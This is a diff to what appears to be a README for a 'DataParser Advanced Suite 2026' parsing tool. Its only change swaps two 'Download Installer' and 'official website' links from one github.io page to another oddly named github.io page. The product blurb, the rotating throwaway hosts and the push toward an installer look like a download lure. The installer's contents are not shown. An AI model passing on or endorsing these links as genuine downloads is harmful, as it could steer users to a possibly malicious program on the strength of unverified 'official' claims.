@@ -2,7 +2,7 @@
 
 DataParser Advanced Suite 2026 is a powerful collection of parser tools designed to handle various data formats with precision and efficiency. From HTML and JSON to log files, this suite offers advanced parsing capabilities that cater to both developers and data analysts, making it an essential tool for data manipulation tasks.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -60,4 +60,4 @@ Here are some frequently asked questions about the DataParser Advanced Suite:
 
 To download the DataParser Advanced Suite 2026, click the link below:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
